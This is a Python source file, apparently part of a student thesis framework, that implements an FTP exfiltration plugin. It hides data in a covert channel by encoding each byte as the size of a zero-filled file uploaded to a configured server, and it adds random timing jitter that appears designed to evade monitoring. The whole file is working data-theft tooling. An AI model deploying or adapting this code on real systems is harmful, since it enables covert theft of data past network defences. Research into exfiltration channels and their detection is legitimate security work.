from __future__ import annotations
from typing import Dict, Any, Iterable
from ftplib import FTP, FTP_TLS, error_perm
import io, time, random

from tfg.plugins.api import ExfilClientPlugin

BASE = 4096  # tamaño base para distinguir (evitar 0 bytes)


def _connect_ftp(config: Dict[str, Any]) -> FTP:
    host = config["host"]
    port = int(config.get("port", 21))
    user = config.get("user") or "anonymous"
    password = config.get("password") or "anonymous@"

    def _login_hint(msg: str) -> RuntimeError:
        return RuntimeError(
            "FTP login failed. Verify FileZilla user is enabled, password is set/saved, "
            "and authentication mode is not 'Use system credentials'. "
            f"Server response: {msg!r}"
        )

    ftp = FTP()
    ftp.connect(host, port, timeout=30)
    try:
        ftp.login(user=user, passwd=password)
        return ftp
    except error_perm as e:
        msg = str(e).lower()
        ftp.close()
        if "login" in msg or "530" in msg or "disabled" in msg:
            raise _login_hint(str(e)) from e
        if "auth" not in msg:
            raise

    ftps = FTP_TLS()
    ftps.connect(host, port, timeout=30)
    ftps.auth()
    try:
        ftps.login(user=user, passwd=password)
    except error_perm as e:
        ftps.close()
        raise _login_hint(str(e)) from e
    ftps.prot_p()
    return ftps


class FtpClientSize(ExfilClientPlugin):
    canal = "FTP"
    metodo = 3
    name = "ftp_client_size"

    def run(self, config: Dict[str, Any], payload_iter: Iterable[bytes]) -> Dict[str, Any]:
        root = config.get("root") or "/"
        exfil_id = config.get("exfil_id") or "tfg"
        ritmo_base = int(config.get("ritmo_base_ms") or 0)
        ritmo_disp = int(config.get("ritmo_dispersion_ms") or 0)

        ftp = _connect_ftp(config)
        if root and root != "/":
            try:
                ftp.cwd(root)
            except Exception:
                ftp.mkd(root)
                ftp.cwd(root)

        seq = 0
        total = 0
        for chunk in payload_iter:
            for b in chunk:
                size = BASE + b
                name = f"{exfil_id}.sz.{seq:06d}"
                if ritmo_base or ritmo_disp:
                    time.sleep(max(0.0, (ritmo_base + random.uniform(-ritmo_disp, ritmo_disp)) / 1000.0))
                ftp.storbinary(f"STOR {name}", io.BytesIO(b"\x00" * size))
                total += 1
                seq += 1
        ftp.storbinary(f"STOR {exfil_id}.EOT", io.BytesIO(b""))
        ftp.quit()
        return {"ok": True, "files": seq, "bytes": total}